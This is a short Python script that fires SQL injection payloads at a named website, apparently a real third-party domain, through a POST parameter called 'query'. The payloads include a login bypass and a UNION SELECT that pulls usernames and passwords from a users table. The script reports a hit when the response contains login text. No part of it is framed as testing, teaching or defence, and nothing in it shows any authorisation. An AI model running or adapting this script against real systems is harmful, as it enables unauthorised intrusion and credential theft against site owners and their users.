import requests

TARGET_URL = 'http://www.laskarnafa.com'

payloads = [
    "' OR '1'='1",
    "' UNION SELECT null, username, password FROM users -- ",
    "' OR 1=1 -- "
]

def attempt_sql_injection(url):
    for payload in payloads:
        # Assuming the vulnerable parameter is 'query'
        data = {'query': payload}
        response = requests.post(url, data=data)
        
        if "Welcome back" in response.text or "username" in response.text:
            print(f"Potential vulnerability found with payload: {payload}")
            return True
    print("No obvious vulnerabilities found with the tested payloads.")
    return False

if __name__ == "__main__":
    attempt_sql_injection(TARGET_URL)
